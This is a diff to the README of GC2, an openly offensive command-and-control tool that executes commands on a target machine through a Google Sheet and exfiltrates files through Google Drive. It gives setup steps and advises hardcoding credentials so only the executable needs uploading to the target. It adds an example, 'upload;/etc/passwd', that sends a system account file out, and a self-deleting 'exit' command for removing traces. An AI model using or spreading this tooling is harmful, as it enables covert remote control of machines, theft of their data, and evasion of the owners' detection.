@@ -1,6 +1,6 @@
 # GC2
 
-GC2 (Google Command and Control) is a Command and Control application that allow an attacker to execute command on the target machine using Google Sheet and exfiltrate data using Google Drive.
+GC2 (Google Command and Control) is a Command and Control application that allows an attacker to execute commands on the target machine using Google Sheet and exfiltrates data using Google Drive.
 
 
 # Set up
@@ -17,15 +17,19 @@ GC2 (Google Command and Control) is a Command and Control application that allow
  
     Create a new google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 
 
-3. **Enable Google Drive API**
+3. **Enable Google Sheet API and Google Drive API**
 
     Enable Google Drive API [https://developers.google.com/drive/api/v3/enable-drive-api](https://developers.google.com/drive/api/v3/enable-drive-api) and Google Sheet API [https://developers.google.com/sheets/api/quickstart/go](https://developers.google.com/sheets/api/quickstart/go) 
 
 3. **Set up Google Sheet and Google Drive**
 
-    Create a new Google Sheet and add the service account to the editor of the spreadsheet (to add the service account use its email)
+    Create a new Google Sheet and add the service account to the editor group of the spreadsheet (to add the service account use its email)
     
-    Create a new Google Drive folder and add the service account to the editor of the folder (to add the service account use its email)
+    ![](img/sheet_permissions.png)
+    
+    Create a new Google Drive folder and add the service account to the editor group of the folder (to add the service account use its email)
+    
+    ![](img/drive_permissions.png)
 
 4. **Start the C2**
 
@@ -33,17 +37,19 @@ GC2 (Google Command and Control) is a Command and Control application that allow
     gc2-sheet --key <GCP service account credential in JSON> --sheet <Google sheet ID> --drive <Google drive ID>
     ```
    
-   PS: you can also hardcode the parameters in the code, so you will have only the executable to upload on the target machine (look at comments in root.go and authentication.go)
+   PS: you can also hardcode the parameters in the code, so you will upload only the executable on the target machine (look at comments in root.go and authentication.go)
 
 ## Features
 
 - Command execution using Google Sheet as a console
 - Download files on the target using Google Drive
 - Data exfiltration using Google Drive
+- Exit
 
 ### Command execution
 
-The program will perform a request to the spreedsheet every 5 sec to check if there is some new command from the column "A" and will print the command result in the column "B". 
+The program will perform a request to the spreedsheet every 5 sec to check if there are some new commands.
+Commands must be inserted in the column "A", and the output will be printed in the column "B". 
 
 ### Data exfiltration file
 
@@ -53,6 +59,7 @@ Special commands are reserved to perform the upload and download to the target m
 From Target to Google Drive
 upload;<remote path>
 Example:
+upload;/etc/passwd
  ```
 
 ### Download file
@@ -63,13 +70,16 @@ Special commands are reserved to perform the upload and download to the target m
  From Google Drive to Target
 download;<google drive file id>;<remote path>
 Example:
+download;<file ID>;/home/user/downloaded.txt
  ```
 
-## TO DO
+### Exit
 
-- Test exfiltration and download with large file
-- Optimize task execution
-- Add some kind of obfuscation
+By sending the command *exit*, the program will delete itself from the target and kill its process
+
+PS: From *os* documentation: 
+*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case the symlink is deleted.
+
 
 # Support the project
 
